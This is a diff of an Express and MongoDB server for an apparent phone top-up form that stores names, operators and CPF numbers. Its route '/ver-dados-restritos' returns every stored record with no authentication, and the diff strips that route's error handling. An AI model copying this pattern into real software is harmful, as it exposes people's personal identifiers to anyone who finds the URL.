@@ -6,12 +6,12 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
 
-// Conexão com MongoDB (Mantenha sua senha segura!)
-mongoose.connect('mongodb+srv://mateus:SUA_SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
-  .then(() => console.log('MongoDB Conectado com Sucesso!'))
-  .catch(err => console.error('Erro na conexão:', err));
+// CONEXÃO COM O MONGODB (USE SUA SENHA REAL AQUI)
+mongoose.connect('mongodb+srv://mateus:SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
+  .then(() => console.log('MongoDB Conectado!'))
+  .catch(err => console.error(err));
 
-// Schema atualizado incluindo o CPF
+// SCHEMA ATUALIZADO COM CPF
 const RecargaSchema = new mongoose.Schema({
     operadora: String,
     nome: String,
@@ -27,26 +27,20 @@ const RecargaSchema = new mongoose.Schema({
 
 const Recarga = mongoose.model('Recarga', RecargaSchema);
 
-// Rota para salvar os dados vindos do formulário
 app.post('/finalizar', async (req, res) => {
     try {
         const novaRecarga = new Recarga(req.body);
         await novaRecarga.save();
         res.status(200).send('Sucesso');
     } catch (error) {
-        console.error(error);
-        res.status(500).send('Erro ao salvar no banco');
+        res.status(500).send('Erro ao salvar');
     }
 });
 
-// Painel administrativo para ver os resultados
+// PAINEL ADMINISTRATIVO
 app.get('/ver-dados-restritos', async (req, res) => {
-    try {
-        const dados = await Recarga.find().sort({ dataRegistro: -1 });
-        res.json(dados);
-    } catch (err) {
-        res.status(500).json({ error: "Erro ao buscar dados" });
-    }
+    const dados = await Recarga.find().sort({ dataRegistro: -1 });
+    res.json(dados);
 });
 
 const PORT = process.env.PORT || 3000;
